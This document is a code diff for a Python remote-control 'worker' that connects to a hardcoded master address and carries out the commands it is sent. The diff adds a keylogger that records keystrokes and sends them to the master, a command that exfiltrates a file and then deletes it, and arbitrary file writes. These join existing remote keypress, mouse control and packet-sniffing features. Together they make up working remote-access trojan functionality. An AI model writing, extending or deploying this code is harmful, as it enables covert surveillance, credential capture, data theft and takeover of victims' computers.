@@ -1,4 +1,4 @@
-import socket
+import shlex
 import subprocess
 import pyautogui
 import io
@@ -7,15 +7,15 @@ from scapy.all import sniff, wrpcap
 from client_http import Client
 from request import Request
 from response import Response
-import sys
+from pynput import keyboard
+import time
 
-MASTER_HOST = sys.argv[1]
-MASTER_PORT = int(sys.argv[2])
+MASTER_HOST = "192.168.68.54"
+MASTER_PORT = 9999
 
 worker = Client()
 worker.open((MASTER_HOST, MASTER_PORT))
 print("[+] Connected to master.")
-
 def recv_all(sock):
     raw = b""
     while True:
@@ -43,7 +43,8 @@ def make_response(status, message, body):
 
 while True:
     raw = recv_all(worker.connection)
-    cmd = Request.load(raw).body.decode(errors="replace").strip()
+    req = Request.load(raw)
+    cmd = req.body.decode(errors="replace").strip()
 
     if cmd == "exit":
         break
@@ -66,6 +67,23 @@ while True:
 
         worker.connection.sendall(response.dump())
 
+    elif cmd.startswith("move"):
+        parts = shlex.split(cmd)
+        source_path = parts[1]
+        destination = parts[5]
+        destination_path = parts[7]
+        if destination == "master":
+            with open(source_path, "rb") as f:
+                file_bytes = f.read()
+            response = make_response(200, "OK", file_bytes)
+        worker.connection.sendall(response.dump())
+        os.remove(source_path)
+
+    if "X-Destination-Path" in req.headers:
+        destination_path = req.headers["X-Destination-Path"][0]
+        with open(destination_path, "wb") as f:
+            f.write(req.body)
+
     elif cmd.startswith("keypress"):
         parts = cmd.split()
         mode = parts[1]
@@ -75,11 +93,33 @@ while True:
             pyautogui.hotkey(*keys)
             response = make_response(200, "OK", "combo keypress process complete")
         else:
+            keys = parts[1:]
             for key in keys:
                 pyautogui.press(key)
             response = make_response(200, "OK", "sequence keypress process complete")
 
         worker.connection.sendall(response.dump())
+
+    elif cmd.startswith("listen"):
+        captured = "Keys Pressed: "
+        duration = int(cmd.split()[2])
+        start_time = time.time()
+        end_time = start_time + duration
+        def on_press(key):
+            global captured
+            try:
+                captured += f"[{key.char}] "
+            except AttributeError:
+                captured += f"[{key.name}] "
+        listener = keyboard.Listener(on_press=on_press)
+        listener.start()
+        while time.time() < end_time:
+            time.sleep(0.05)
+        listener.stop()
+        listener.join()
+        response = make_response(200, "OK", body=captured)
+        worker.connection.sendall(response.dump())
+
 
     elif cmd.startswith("mouse"):
         actions = cmd[6:].split(",")
@@ -95,7 +135,6 @@ while True:
         worker.connection.sendall(response.dump())
 
     elif cmd.startswith("sniff"):
-        import shlex
         parts = shlex.split(cmd)
         filter_str = parts[1]
         duration = int(parts[2])
@@ -128,3 +167,4 @@ while True:
         worker.connection.sendall(response.dump())
 
 worker.connection.close()
+
